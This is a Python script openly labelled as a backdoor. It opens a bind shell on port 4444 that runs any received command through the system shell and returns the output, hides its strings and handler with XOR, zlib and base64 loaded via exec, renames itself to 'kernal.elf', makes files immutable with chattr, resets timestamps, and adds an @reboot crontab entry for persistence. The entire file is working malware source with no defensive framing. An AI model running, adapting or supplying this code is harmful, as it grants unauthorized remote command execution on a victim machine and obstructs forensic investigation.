import os
import socket
import subprocess
import time
import base64
import zlib

# Advanced string obfuscation using XOR + zlib + base64
def advanced_obfuscate_string(s, key):
    compressed = zlib.compress(s.encode())  # Compress the string to bytes
    xor_encrypted = bytes([b ^ ord(k) for b, k in zip(compressed, key * len(compressed))])  # XOR encrypt as bytes
    return base64.b64encode(xor_encrypted).decode()  # Encode as base64 and return string

def advanced_decrypt_string(enc_string, key):
    decoded = base64.b64decode(enc_string)  # Decode base64 back to bytes
    xor_decrypted = bytes([b ^ ord(k) for b, k in zip(decoded, key * len(decoded))])  # XOR decrypt bytes
    return zlib.decompress(xor_decrypted).decode()  # Decompress and convert back to string

key = 'secret_key'

# Obfuscated strings
obfuscated_host = advanced_obfuscate_string('0.0.0.0', key)
obfuscated_quit = advanced_obfuscate_string('quit', key)  # Obfuscated quit command

# Decrypt the strings dynamically
host = advanced_decrypt_string(obfuscated_host, key)
port = 4444

# Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print(f"Backdoor created and listening on {host}:{port}")

# Anti-forensics and persistence
script_path = os.path.abspath(__file__)
os.system(f'mv "{script_path}" kernal.elf')
os.system('chattr +i *')

for file in os.listdir():
    os.utime(file, (time.time(), time.time()))

if os.name == 'posix':
    os.system(f'(crontab -l 2>/dev/null; echo "@reboot {script_path}") | crontab -')

# Define the handle_connection function to be obfuscated
handle_connection_code = '''
def hc_x1x2(cs_x1x2):
    while True:
        command = cs_x1x2.recv(1024).decode()  # Received command from the client
        
        # Compare the command to the obfuscated 'quit' command
        if command.lower() == advanced_decrypt_string(''' + repr(obfuscated_quit) + ''', key):
            cs_x1x2.close()
            break
        
        # Execute the command and send back the result
        output = subprocess.run(command, shell=True, capture_output=True)
        cs_x1x2.send(output.stdout)  # Send the result back to the client
'''

# Obfuscate the handle_connection function
obfuscated_handle_connection = base64.b64encode(zlib.compress(handle_connection_code.encode())).decode()

# Dictionary to hold the namespace of the dynamically decoded function
exec_namespace = {
    'advanced_decrypt_string': advanced_decrypt_string,  # Add advanced_decrypt_string to the exec namespace
    'key': key  # Also add the key to the namespace so the function can access it
}

# Decode and execute the obfuscated function, populating the namespace
exec(zlib.decompress(base64.b64decode(obfuscated_handle_connection)).decode(), exec_namespace)

# Main loop to accept connections
while True:
    cs_x1x2, addr = s.accept()
    print(f"Connection from {addr}")
    
    # Call the dynamically defined function from the namespace
    exec_namespace['hc_x1x2'](cs_x1x2)

# Close the socket (never reached in normal operation)
s.close()
